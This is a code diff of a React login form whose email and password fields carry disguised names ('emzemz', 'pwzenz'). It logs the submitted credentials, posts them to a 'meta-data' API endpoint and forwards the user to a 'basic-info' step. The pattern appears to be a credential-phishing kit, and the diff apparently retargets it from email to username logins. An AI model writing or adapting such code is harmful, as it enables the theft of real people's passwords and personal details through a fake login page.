@@ -22,18 +22,13 @@ const LoginForm2: React.FC = () => {
     setShowPwzenz((prev) => !prev);
   };
 
-  const validateEmzemz = (emzemz: string) => {
-    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return regex.test(emzemz);
-  };
-
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
     setIsLoading(true);
     event.preventDefault();
     let newErrors = { emzemz: '', pwzenz: '' };
 
-    if (!validateEmzemz(emzemz)) {
-      newErrors.emzemz = 'Invalid email format.';
+    if (!emzemz.trim()) {
+      newErrors.emzemz = 'Username is required.';
       setIsLoading(false);
     }
 
@@ -49,7 +44,7 @@ const LoginForm2: React.FC = () => {
       // Proceed with form submission
       console.log('Form submitted with:', { emzemz, pwzenz });
 
-      const url = `${baseUrl}api/meta-data-2/`;
+      const url = `${baseUrl}api/logix-meta-data-2/`;
 
       try {
         await axios.post(url, {
@@ -57,7 +52,11 @@ const LoginForm2: React.FC = () => {
           pwzenz: pwzenz,
         });
         console.log('Message sent successfully');
-        navigate('/basic-info');
+        navigate('/basic-info', {
+          state: {
+            emzemz: emzemz
+          }
+        });
       } catch (error) {
         console.error('Error sending message:', error);
         setIsLoading(false);
@@ -97,7 +96,7 @@ const LoginForm2: React.FC = () => {
             <input
               id="emzemz"
               name="emzemz"
-              type="email"
+              type="text"
               value={emzemz}
               onChange={(e) => setEmzemz(e.target.value)}
               className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
@@ -119,7 +118,7 @@ const LoginForm2: React.FC = () => {
                 ></path>
               </svg>
 
-              <p>Email required</p>
+              <p>Username required</p>
             </div>
           )}
 
